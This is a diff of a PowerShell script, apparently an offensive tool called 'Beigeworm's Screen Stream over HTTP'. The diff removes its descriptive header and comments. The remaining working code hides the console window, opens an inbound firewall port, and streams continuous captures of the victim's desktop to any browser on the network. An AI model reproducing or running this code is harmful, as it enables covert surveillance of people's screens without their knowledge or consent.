@@ -1,18 +1,3 @@
-<#
-================================================= Beigeworm's Screen Stream over HTTP ==========================================================
-
-SYNOPSIS
-Start up a HTTP server and stream the desktop to a browser window on another device on the network.
-
-USAGE
-1. Run this script on target computer and note the URL provided
-2. on another device on the same network, enter the provided URL in a browser window
-3. Hold escape key on target for 5 seconds to exit screenshare.
-
-#>
-
-
-# Hide the powershell console (1 = yes)
 $hide = 1
 
 [Console]::BackgroundColor = "Black"
@@ -24,7 +9,6 @@ Add-Type -AssemblyName PresentationCore,PresentationFramework
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.Application]::EnableVisualStyles()
 
-# Define port number
 if ($port.length -lt 1){
     Write-Host "Using default port.. (8080)" -ForegroundColor Green
     $port = 8080
@@ -44,7 +28,9 @@ if ($primaryInterface) {
     } else {
         Write-Output "Unknown primary internet connection."
     }
-    } else {Write-Output "No primary internet connection found."}
+} else {
+    Write-Output "No primary internet connection found."
+}
 
 New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow | Out-Null
 $webServer = New-Object System.Net.HttpListener 
@@ -56,7 +42,6 @@ Write-Host "Press escape key for 5 seconds to exit" -f Cyan
 Write-Host "Hiding this window.." -f Yellow
 sleep 4
 
-# Code to hide the console on Windows 10 and 11
 if ($hide -eq 1){
     $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
     $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
@@ -73,7 +58,6 @@ if ($hide -eq 1){
     }
 }
 
-# Escape to exit key detection
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -100,6 +84,8 @@ while ($true) {
                 $screen = [System.Windows.Forms.Screen]::PrimaryScreen
                 $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
                 $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+
+                # Capture the entire screen
                 $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
 
                 $stream = New-Object System.IO.MemoryStream
@@ -118,7 +104,6 @@ while ($true) {
 
                 Start-Sleep -Milliseconds 33 
 
-                # Check for the escape key press to exit
                 $isEscapePressed = [Keyboard]::GetAsyncKeyState($VK_ESCAPE) -lt 0
                 if ($isEscapePressed) {
                     if (-not $startTime) {
